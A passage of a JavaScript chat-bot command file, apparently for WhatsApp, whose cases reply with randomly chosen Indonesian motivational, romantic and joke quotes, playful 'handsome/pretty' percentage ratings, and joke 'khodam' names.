"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    payreply(`"${motivasii}"`)
}
break
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const Hazazeltruth = bucin[Math.floor(Math.random() * bucin.length)]
	payreply(`${Hazazeltruth}`)
}
break
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  payreply(bacotan)
}
break
                
case "cekganteng": {
if (!args[0]) return payreply('NAMA LU MANA??')
const ganteng = [
"cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet","80% gantengggg parah","90% Ganteng idaman ciwi ciwi","100% Ganteng Bgt bjirr"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
payreply(teks)
}
break

case "cekcantik": {
if (!args[0]) return payreply('NAMA LU MANA??')
const cantik = [
"cuman 10% doang", 
"20% kurang cantik soal nya", 
"0% karna nggak cantik", 
"30% mayan cantikk", 
"40% cantik", 
"50% otw bikin cowo salting 😎", 
"60% orang cantik", 
"70% cantik bet", 
"80% cantikk parah", 
"90% cantik idaman cowo", 
"100% cantik bgt bjirr"
]
const hasil = cantik[Math.floor(Math.random() * cantik.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
payreply(teks)
}
break

case 'cekkhodam': case 'cekkodam': {
if (!text) return payreply('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"Kulkas 2 pintu",
"Kumis lele",
"Kumis Lele",
"Lemari dua Pintu",
"Kacang Hijau",
"Kulkas mini",
"Burung beo",
"Air",
"Api",
"Batu",
"Magnet",
"Sempak",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"sungut lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Bjorka",
"Hacker",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak",
"Aromanis",
"Gelembung sabun",
"Kuda",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
